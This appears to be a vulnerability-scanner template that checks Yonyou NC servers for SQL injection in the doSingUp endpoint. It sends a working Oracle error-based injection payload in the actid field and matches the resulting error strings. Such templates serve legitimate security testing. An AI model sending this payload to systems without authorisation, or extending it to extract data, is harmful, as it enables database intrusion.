id: poc-yaml-yonyou-ufida-nc-dosingup-sqli
info:
  name: 用友NC doSingUp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    用友NC doSingUp endpoint is vulnerable to SQL injection, allowing attackers to exploit the backend via crafted payloads.

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ufida"

  - method: POST
    path:
      - "{{BaseURL}}/portal/pt/ActivityNotice/doSingUp"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: |
      pageId=login&pk_psndoc=1&actid=1' AND 7722=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(122)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7722=7722) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113))-- Jvzs
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "未知的主机"
          - "qzjbq1qxxbq"
          - "SYS.UTL_INADDR"
